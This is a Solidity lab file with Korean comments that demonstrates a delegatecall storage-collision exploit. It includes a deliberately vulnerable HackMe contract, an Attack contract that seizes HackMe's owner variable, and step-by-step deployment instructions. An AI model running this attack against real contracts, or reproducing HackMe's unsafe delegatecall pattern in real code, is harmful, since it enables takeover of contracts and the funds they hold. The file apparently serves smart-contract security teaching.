// SPDX-License-Identifier: MIT
pragma solidity 0.8.18;

/*
    1. Lib => HackMe => Attack 순서로 배포
    2. HackMe 의 lib , owner 상태변수 확인
    3. Attack 의 attack 함수의 인자로 정수를 넣고 실행(아무거나)
    4. HackMe 의 owner 상태변수 확인. 원하는 owner 로 바뀜.

    *** delegate call 에서는 슬롯이 바뀌거나 줄어들 수 없음. 생성은 가능. ***
*/

contract Lib {
    uint public someNumber; // slot 0

    function doSomething(uint _num) public {
        someNumber = _num;
    }
}

contract HackMe {
    address public lib; // slot 0
    address public owner; // 1
    uint public someNumber; // 2

    constructor(address _lib) public {
        lib = _lib;
        owner = msg.sender;
    }

    function doSomething(uint _num) public {
        lib.delegatecall(abi.encodeWithSignature("doSomething(uint256)", _num));
    }
}

contract Attack {
    /* 
        상태변수의 slot 수를 맞춰야 함.
        bool, uint8 같은 타입은 0번째 슬롯에 빈 자리가 생겨 공격 X.
        string, uint, address 는 0번째 슬롯에 여유가 없기에 공격 O.
    */
    string public lib; // slot 0
    address public owner; // slot 1
    uint public someNumber; // slot 2

    HackMe public hackme; // slot 3
    
    constructor(address _hackme) {
        hackme = HackMe(_hackme);
    }
    
    function attack(uint256 _newOwner) public {
        hackme.doSomething(uint160(address(this)));
        hackme.doSomething(1);
    }

    function doSomething(uint _newOwner) public {
        owner = msg.sender;
    }
}
